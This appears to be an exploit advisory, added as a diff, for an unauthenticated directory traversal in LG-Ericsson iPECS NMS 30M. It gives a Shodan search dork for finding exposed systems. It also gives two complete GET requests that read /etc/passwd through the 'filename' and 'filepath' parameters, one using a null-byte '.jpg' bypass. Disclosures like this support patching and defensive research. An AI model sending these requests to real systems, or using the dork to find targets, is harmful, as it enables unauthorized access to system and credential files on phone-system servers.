@@ -1,0 +1,24 @@
+# Exploit Title: LG-Ericsson iPECS NMS 30M - Directory Traversal
+# Shodon Dork: iPECS CM
+# Exploit Author: Safak Aslan
+# Software Link: www.ipecs.com
+# Version: 30M-B.2Ia and 30M-2.3Gn
+# Authentication Required: No
+# Tested on: Linux
+# CVE: N/A
+
+# Description
+# The directory traversal was detected on LG-Ericsson's iPECS product that
+# can be exploited to reach sensitive info on the vulnerable system. 
+# Ericsson-LG iPECS NMS 30M allows directory traversal via 
+# ipecs-cm/download?filename=../ URIs.
+
+# The GET input of the "filename" has been set to ../../../../../../../../../../etc/passwd.
+# By the sending of the below GET request, it is possible to reach configuration files directly.
+
+targetIP/ipecs-cm/download?filename=../../../../../../../../../../etc/passwd&filepath=/home/wms/www/data 
+
+# The GET input of the "filepath" has been set to ../../../../../../../../../../etc/passwd%00.jpg.
+# By the sending of the below GET request, it is possible to reach configuration files directly.
+
+targetIP/ipecs-cm/download?filename=jre-6u13-windows-i586-p.exe&filepath=../../../../../../../../../../etc/passwd%00.jpg
